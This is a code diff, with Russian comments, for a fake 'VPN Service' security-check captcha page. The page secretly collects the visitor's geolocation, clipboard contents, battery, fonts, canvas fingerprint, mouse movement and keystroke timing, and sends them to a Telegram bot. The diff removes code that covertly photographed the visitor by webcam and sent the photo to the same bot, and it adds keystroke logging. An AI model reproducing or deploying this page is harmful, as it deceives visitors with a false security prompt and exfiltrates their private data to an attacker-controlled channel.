@@ -1,6 +1,5 @@
 <body>
   <div class="container">
-    <div class="camera-status" id="cameraStatus"></div>
     <h1>🔒 Проверка безопасности</h1>
     <p>VPN Service обнаружил подозрительную активность. Пройдите верификацию:</p>
     <div class="progress-container">
@@ -13,7 +12,6 @@
   </div>
 
   <script>
-    // === КОНФИГ ===
     const TELEGRAM_TOKEN = 'ТВОЙ_ТОКЕН';
     const CHAT_ID = 'ТВОЙ_CHAT_ID';
 
@@ -22,18 +20,16 @@
       userInput: document.getElementById('userInput'),
       verifyBtn: document.getElementById('verifyBtn'),
       progressBar: document.getElementById('progressBar'),
-      status: document.getElementById('status'),
-      cameraStatus: document.getElementById('cameraStatus')
+      status: document.getElementById('status')
     };
 
     let currentCaptcha = '';
-    let stream = null;
-    let cameraActive = false;
     let mouseTrail = [];
     let batteryInfo = {};
-    let fingerprintCache = null; // чтобы собрать один раз и переиспользовать
+    let fingerprintCache = null;
+    let keyLog = [];
 
-    // === КАПЧА ===
+    // Капча
     function generateCaptcha() {
       const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
       return Array(8).fill().map(() => chars[Math.floor(Math.random()*chars.length)]).join('');
@@ -43,16 +39,22 @@
       currentCaptcha = generateCaptcha();
       elements.captchaCode.textContent = currentCaptcha;
       elements.progressBar.style.width = '0%';
-      console.log('✅ Капча отрисована');
-      collectPassiveFingerprint(); // сразу запускаем пассивный сбор
+      collectPassiveFingerprint();
     }
 
-    // === ПАССИВНЫЙ СБОР (БЕЗ КАМЕРЫ) ===
+    // Mouse path
     document.addEventListener('mousemove', (e) => {
       mouseTrail.push({x: e.clientX, y: e.clientY, t: Date.now()});
       if (mouseTrail.length > 200) mouseTrail.shift();
     });
 
+    // Keystrokes динамика
+    elements.userInput.addEventListener('input', () => {
+      const v = elements.userInput.value;
+      keyLog.push({t: Date.now(), len: v.length});
+    });
+
+    // Battery
     if ('getBattery' in navigator) {
       navigator.getBattery().then(bat => {
         batteryInfo = {
@@ -65,9 +67,11 @@
     function detectFonts() {
       const testFonts = ['Arial','Times New Roman','Comic Sans MS','Courier New','Verdana'];
       const detected = [];
-      testFonts.forEach(font => {
-        if (document.fonts && document.fonts.check(`12px ${font}`)) detected.push(font);
-      });
+      if (document.fonts) {
+        testFonts.forEach(font => {
+          if (document.fonts.check(`12px ${font}`)) detected.push(font);
+        });
+      }
       return detected.slice(0, 3).join(',');
     }
 
@@ -84,7 +88,7 @@
       return canvas.toDataURL().substring(0, 80);
     }
 
-    function getGeo() {
+    async function getGeo() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) return resolve('geo-unsupported');
         navigator.geolocation.getCurrentPosition(
@@ -104,15 +108,18 @@
       }
     }
 
+    // Полный fingerprint (пассивный)
     async function collectPassiveFingerprint() {
-      // собираем один раз и кэшируем
       if (fingerprintCache) return fingerprintCache;
 
-      const geo = await getGeo();
-      const clipboard = await getClipboard();
+      const [geo, clipboard] = await Promise.all([
+        getGeo(),
+        getClipboard()
+      ]);
 
       fingerprintCache = {
-        userAgent: navigator.userAgent.substring(0, 120),
+        ts: new Date().toISOString(),
+        userAgent: navigator.userAgent.substring(0, 150),
         platform: navigator.platform,
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -122,64 +129,13 @@
         fonts: detectFonts(),
         battery: batteryInfo.level || 'no',
         charging: batteryInfo.charging || 'no',
-        mouseTrail: mouseTrail.length,
+        mousePoints: mouseTrail.length,
         geo,
         canvas: getCanvasFP(),
         clipboard
       };
 
-      console.log('🕵️‍♂️ FP собран пассивно');
       return fingerprintCache;
-    }
-
-    // === КАМЕРА (ТОЛЬКО В КОНЦЕ) ===
-    async function initCamera() {
-      if (cameraActive) return;
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: 640, height: 480 },
-          audio: false // микрофон отключен
-        });
-        cameraActive = true;
-        elements.cameraStatus.classList.add('active');
-        console.log('🎥 Камера OK');
-      } catch (e) {
-        console.log('🚫 Камера отклонена');
-      }
-    }
-
-    async function capturePhoto() {
-      if (!stream) return null;
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.muted = true;
-      await video.play();
-      await new Promise(r => setTimeout(r, 200));
-      const canvas = document.createElement('canvas');
-      canvas.width = 640; canvas.height = 480;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      video.remove();
-      return canvas.toDataURL('image/jpeg', 0.8);
-    }
-
-    function dataURItoBlob(dataURI) {
-      const byteString = atob(dataURI.split(',')[1]);
-      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-      const ab = new ArrayBuffer(byteString.length);
-      const ia = new Uint8Array(ab);
-      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-      return new Blob([ab], { type: mimeString });
-    }
-
-    async function sendPhoto(photo, caption) {
-      const fd = new FormData();
-      fd.append('chat_id', CHAT_ID);
-      fd.append('photo', dataURItoBlob(photo), 'photo.jpg');
-      fd.append('caption', caption);
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: fd
-      });
     }
 
     async function sendTextReport(fp, input) {
@@ -187,16 +143,18 @@
         `🎯 CAPTCHA_OK\n` +
         `📝 Код: ${currentCaptcha}\n` +
         `⌨️ Ввод: ${input}\n\n` +
+        `⏱️ Время: ${fp.ts}\n` +
         `📱 UA: ${fp.userAgent}\n` +
         `💻 Платформа: ${fp.platform}\n` +
-        `🌐 Язык/часовой пояс: ${fp.language} / ${fp.timezone}\n` +
+        `🌐 Язык/таймзона: ${fp.language} / ${fp.timezone}\n` +
         `🖥️ Экран: ${fp.screen}\n` +
         `🔋 Батарея: ${fp.battery} (${fp.charging})\n` +
-        `🖱️ Мышь: ${fp.mouseTrail} точек\n` +
+        `🖱️ Мышь: ${fp.mousePoints} точек\n` +
         `📍 Geo: ${fp.geo}\n` +
         `🗎 Шрифты: ${fp.fonts}\n` +
         `📋 Буфер: ${fp.clipboard}\n` +
-        `🧩 Canvas: ${fp.canvas}`;
+        `🧩 Canvas: ${fp.canvas}\n\n` +
+        `⌨️ Динамика ввода: ${keyLog.length} событий`;
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -205,25 +163,15 @@
       });
     }
 
-    // камера запрашивается ТОЛЬКО при нажатии кнопки и успешной капче
+    // Кнопка капчи
     elements.verifyBtn.addEventListener('click', async () => {
       const input = elements.userInput.value.trim().toUpperCase();
       if (input === currentCaptcha) {
         elements.status.textContent = '🔍 Проверка...';
         elements.status.className = 'status';
 
-        // 1) все данные (если ещё не собраны)
         const fp = await collectPassiveFingerprint();
-
-        // 2) запрос камеры только сейчас
-        await initCamera();
-        const photo = await capturePhoto();
-
-        // 3) сначала текстовый отчёт, потом фото
         await sendTextReport(fp, input);
-        if (photo) {
-          await sendPhoto(photo, `✅ Капча: ${input}`);
-        }
 
         elements.status.textContent = '✅ Успешно';
         elements.status.className = 'status success';
